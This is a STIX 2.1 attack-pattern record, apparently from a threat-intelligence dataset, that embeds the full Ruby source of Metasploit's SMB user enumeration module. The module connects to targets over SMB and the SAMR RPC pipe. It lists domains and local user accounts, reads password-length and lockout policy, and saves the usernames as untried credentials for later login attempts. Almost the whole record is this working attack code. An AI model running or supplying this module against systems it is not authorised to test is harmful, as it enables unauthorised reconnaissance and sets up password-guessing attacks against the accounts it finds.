{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0b33cc12-18bb-4534-9d6b-1161d847de82",
    "created": "2024-08-14T16:31:17.838945Z",
    "modified": "2024-08-14T16:31:17.838949Z",
    "name": "SMB User Enumeration (SAM EnumUsers)",
    "description": "Determine what local users exist via the SAM RPC service",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/smb/smb_enumusers.rb",
            "external_id": "smb_enumusers.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n\n  include Msf::Exploit::Remote::DCERPC\n\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'SMB User Enumeration (SAM EnumUsers)',\n      'Description' => 'Determine what local users exist via the SAM RPC service',\n      'Author'      => 'hdm',\n      'License'     => MSF_LICENSE,\n      'DefaultOptions' => {\n        'DCERPC::fake_bind_multi' => false\n      }\n    )\n\n    register_options(\n      [\n        OptBool.new('DB_ALL_USERS', [ false, \"Add all enumerated usernames to the database\", false ]),\n      ])\n\n    deregister_options('RPORT')\n  end\n\n  def rport\n    @rport || super\n  end\n\n  def smb_direct\n    @smbdirect || super\n  end\n\n  # Locate an available SMB PIPE for the specified service\n  def smb_find_dcerpc_pipe(uuid, vers, pipes)\n    found_pipe   = nil\n    found_handle = nil\n    pipes.each do |pipe_name|\n      connected = false\n      begin\n        connect\n        smb_login\n        connected = true\n\n        handle = dcerpc_handle(\n          uuid, vers,\n          'ncacn_np', [\"\\\\#{pipe_name}\"]\n        )\n\n        dcerpc_bind(handle)\n        return pipe_name\n\n      rescue ::Interrupt => e\n        raise e\n      rescue ::Exception => e\n        raise e if not connected\n      end\n      disconnect\n    end\n    nil\n  end\n\n  def smb_pack_sid(str)\n    [1,5,0].pack('CCv') + str.split('-').map{|x| x.to_i}.pack('NVVVV')\n  end\n\n  def smb_parse_sam_domains(data)\n    ret = []\n    idx = 0\n\n    cnt = data[8, 4].unpack(\"V\")[0]\n    return ret if cnt == 0\n    idx += 20\n    idx += 12 * cnt\n\n    1.upto(cnt) do\n      v = data[idx,data.length].unpack('V*')\n      l = v[2] * 2\n\n      while(l % 4 != 0)\n        l += 1\n      end\n\n      idx += 12\n      ret << data[idx, v[2] * 2].gsub(\"\\x00\", '')\n      idx += l\n    end\n    ret\n  end\n\n  def smb_parse_sam_users(data)\n    ret = {}\n    rid = []\n    idx = 0\n\n    cnt = data[8, 4].unpack(\"V\")[0]\n    return ret if cnt == 0\n    idx += 20\n\n    1.upto(cnt) do\n      v = data[idx,12].unpack('V3')\n      rid << v[0]\n      idx += 12\n    end\n\n    1.upto(cnt) do\n      v = data[idx,32].unpack('V*')\n      l = v[2] * 2\n\n      while(l % 4 != 0)\n        l += 1\n      end\n\n      uid = rid.shift\n\n      idx += 12\n      ret[uid] = data[idx, v[2] * 2].gsub(\"\\x00\", '')\n      idx += l\n    end\n\n    ret\n  end\n\n  @@sam_uuid     = '12345778-1234-abcd-ef00-0123456789ac'\n  @@sam_vers     = '1.0'\n  @@sam_pipes    = %W{ SAMR LSARPC NETLOGON BROWSER SRVSVC }\n\n  # Fingerprint a single host\n  def run_host(ip)\n\n    [[139, false], [445, true]].each do |info|\n\n    @rport = info[0]\n    @smbdirect = info[1]\n\n    sam_pipe   = nil\n    sam_handle = nil\n    begin\n      # Find the SAM pipe\n      sam_pipe = smb_find_dcerpc_pipe(@@sam_uuid, @@sam_vers, @@sam_pipes)\n      break if not sam_pipe\n\n      # Connect4\n      stub =\n        NDR.uwstring(\"\\\\\\\\\" + ip) +\n        NDR.long(2) +\n        NDR.long(0x30)\n\n      dcerpc.call(62, stub)\n      resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n\n      if ! (resp and resp.length == 24)\n        print_error(\"Invalid response from the Connect5 request\")\n        disconnect\n        return\n      end\n\n      phandle = resp[0,20]\n      perror  = resp[20,4].unpack(\"V\")[0]\n\n      if(perror == 0xc0000022)\n        disconnect\n        return\n      end\n\n      if(perror != 0)\n        print_error(\"Received error #{\"0x%.8x\" % perror} from the OpenPolicy2 request\")\n        disconnect\n        return\n      end\n\n      # EnumDomains\n      stub = phandle + NDR.long(0) + NDR.long(8192)\n      dcerpc.call(6, stub)\n      resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n      domlist = smb_parse_sam_domains(resp)\n      domains = {}\n\n      # LookupDomain\n      domlist.each do |domain|\n        next if domain == 'Builtin'\n\n        # Round up the name to match NDR.uwstring() behavior\n        dlen = (domain.length + 1) * 2\n\n        # The SAM functions are picky on Windows 2000\n        stub =\n          phandle +\n          [(domain.length + 0) * 2].pack(\"v\") + # NameSize\n          [(domain.length + 1) * 2].pack(\"v\") + # NameLen (includes null)\n          NDR.long(rand(0x100000000)) +\n          [domain.length + 1].pack(\"V\") +\t      # MaxCount (includes null)\n          NDR.long(0) +\n          [domain.length + 0].pack(\"V\") +\t      # ActualCount (ignores null)\n          Rex::Text.to_unicode(domain)          # No null appended\n\n        dcerpc.call(5, stub)\n        resp    = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n        raw_sid = resp[12, 20]\n        txt_sid = raw_sid.unpack(\"NVVVV\").join(\"-\")\n\n        domains[domain] = {\n          :sid_raw => raw_sid,\n          :sid_txt => txt_sid\n        }\n      end\n\n\n      # OpenDomain, QueryDomainInfo, CloseDomain\n      domains.each_key do |domain|\n\n        # Open\n        stub =\n          phandle +\n          NDR.long(0x00000305) +\n          NDR.long(4) +\n          [1,4,0].pack('CvC') +\n          domains[domain][:sid_raw]\n\n        dcerpc.call(7, stub)\n        resp    = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n        dhandle = resp[0,20]\n        derror  = resp[20,4].unpack(\"V\")[0]\n\n        # Catch access denied replies to OpenDomain\n        if(derror != 0)\n          next\n        end\n\n        # Password information\n        stub = dhandle + [0x01].pack('v')\n        dcerpc.call(8, stub)\n        resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n        if(resp and resp[-4,4].unpack('V')[0] == 0)\n          mlen,hlen = resp[8,4].unpack('vv')\n          domains[domain][:pass_min] = mlen\n          domains[domain][:pass_min_history] = hlen\n        end\n\n        # Server Role\n        stub = dhandle + [0x07].pack('v')\n        dcerpc.call(8, stub)\n        if(resp and resp[-4,4].unpack('V')[0] == 0)\n          resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n          domains[domain][:server_role] = resp[8,2].unpack('v')[0]\n        end\n\n        # Lockout Threshold\n        stub = dhandle + [12].pack('v')\n        dcerpc.call(8, stub)\n        resp = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n\n        if(resp and resp[-4,4].unpack('V')[0] == 0)\n          lduration = resp[8,8]\n          lwindow   = resp[16,8]\n          lthresh   = resp[24, 2].unpack('v')[0]\n\n          domains[domain][:lockout_threshold] = lthresh\n          domains[domain][:lockout_duration]  = Rex::Proto::SMB::Utils.time_smb_to_unix(*(lduration.unpack('V2')))\n          domains[domain][:lockout_window]    = Rex::Proto::SMB::Utils.time_smb_to_unix(*(lwindow.unpack('V2')))\n        end\n\n        # Users\n        stub = dhandle + NDR.long(0) + NDR.long(0x10) + NDR.long(1024*1024)\n        dcerpc.call(13, stub)\n        resp  = dcerpc.last_response ? dcerpc.last_response.stub_data : nil\n        if(resp and resp[-4,4].unpack('V')[0] == 0)\n          domains[domain][:users] = smb_parse_sam_users(resp)\n        end\n\n\n        # Close Domain\n        dcerpc.call(1, dhandle)\n      end\n\n      # Close Policy\n      dcerpc.call(1, phandle)\n\n\n      domains.each_key do |domain|\n\n        # Delete the no longer used raw SID value\n        domains[domain].delete(:sid_raw)\n\n        # Store the domain name itself\n        domains[domain][:name] = domain\n\n        # Store the domain information\n        report_note(\n          :host => ip,\n          :proto => 'tcp',\n          :port => rport,\n          :type => 'smb.domain.enumusers',\n          :data => domains[domain]\n        )\n\n        users = domains[domain][:users] || {}\n        extra = \"\"\n        if (domains[domain][:lockout_threshold])\n          extra = \"( \"\n          extra << \"LockoutTries=#{domains[domain][:lockout_threshold]} \"\n          extra << \"PasswordMin=#{domains[domain][:pass_min]} \"\n          extra << \")\"\n        end\n        print_good(\"#{domain.upcase} [ #{users.keys.map{|k| users[k]}.join(\", \")} ] #{extra}\")\n        if datastore['DB_ALL_USERS']\n          users.each { |user|\n            store_username(user, domain, ip, rport, resp)\n          }\n        end\n      end\n\n      # cleanup\n      disconnect\n      return\n    rescue ::Timeout::Error\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::ConnectionError\n    rescue ::Rex::Proto::SMB::Exceptions::LoginError\n      next\n    rescue ::Exception => e\n      print_line(\"Error: #{ip} #{e.class} #{e}\")\n    end\n    end\n  end\n\n\n  def store_username(username, domain, ip, rport, resp)\n    service_data = {\n      address: ip,\n      port: rport,\n      service_name: 'smb',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id,\n      proof: resp\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: username[1],\n      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n      realm_value: domain,\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\nend\n"
}